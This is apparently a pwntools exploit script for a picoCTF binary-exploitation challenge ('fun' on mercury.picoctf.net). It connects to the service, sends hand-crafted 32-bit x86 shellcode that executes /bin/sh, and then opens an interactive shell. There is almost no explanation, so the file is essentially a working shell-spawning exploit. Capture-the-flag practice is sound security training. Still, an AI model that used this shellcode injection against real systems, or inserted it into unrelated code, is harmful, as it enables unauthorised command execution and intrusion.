#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mercury.picoctf.net --port 16460 ./fun
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./fun')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mercury.picoctf.net'
port = int(args.PORT or 16460)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        p = process([exe.path] + argv, *a, **kw)
        gdb.attach(p)
        raw_input(1)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()

shellcode = b'\x31\xc0\x31\xd2\x50\x90\xb5\x68\xb1\x73\x66\x51\xb5\x2f\xb1\x2f\x66\x51\xb7\x6e\xb3\x69\x66\x53\xb5\x62\x66\x51\x89\xe3\x50\x90\x53\x90\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80'
#for i in range(0,int(len(shellcode)/2)):
#	shellcode_reformat += shellcode[2*i:(2*i+2)]
#	shellcode_reformat += b'\x90\x90'
#print('shellcode:',shellcode_reformat)

io.sendline(shellcode)

io.interactive()

